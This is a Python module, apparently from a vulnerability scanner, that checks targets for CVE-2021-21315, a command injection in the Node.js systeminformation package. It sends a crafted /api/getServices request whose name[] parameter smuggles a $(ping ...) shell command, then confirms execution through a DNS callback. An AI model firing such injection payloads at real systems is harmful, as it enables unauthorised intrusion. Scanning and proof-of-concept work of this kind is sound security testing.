#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import time
import threading
from thirdparty import requests
from module import globals
from core.verify import verify
from module.api.dns import dns_result, dns_request
from thirdparty.requests_toolbelt.utils import dump


class NodeJs():
    def __init__(self, url):
        self.url = url
        if self.url[-1] == "/":
            self.url = self.url[:-1]
        self.raw_data = None
        self.vul_info = {}
        self.ua = globals.get_value("UA")  # 获取全局变量UA
        self.timeout = globals.get_value("TIMEOUT")  # 获取全局变量UA
        self.headers = globals.get_value("HEADERS")  # 获取全局变量HEADERS
        self.threadLock = threading.Lock()

    def cve_2021_21315_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Node.JS: CVE-2021-21315"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "Node.JS Command Injection"
        self.vul_info["vul_numb"] = "CVE-2021-21315"
        self.vul_info["vul_apps"] = "Node.JS"
        self.vul_info["vul_date"] = "2021-02-25"
        self.vul_info["vul_vers"] = "Systeminformation < 5.3.1"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "Command Injection"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "CVE-2021-21315 Node.JS OS sanitize service Parameters Command Injection"
        self.vul_info["cre_date"] = "2021-03-04"
        self.vul_info["cre_auth"] = "zhzyker"
        headers = {
            "User-agent": self.ua,
            "Connection": "close"
        }

        md = dns_request()
        cmd = "ping%20" + md
        payload = "/api/getServices?name[]=$(RECOMMAND)".replace("RECOMMAND", cmd)
        url = self.url + payload
        try:
            try:
                req = requests.get(url, headers=headers, timeout=3, verify=False)
                r = dump.dump_all(req).decode('utf-8', 'ignore')
            except:
                r = "null"
                pass
            if dns_result(md):
                self.vul_info["vul_data"] = r
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["vul_payd"] = payload
                self.vul_info["prt_info"] = "[dns] [payload:" + url + " ]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as error:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()
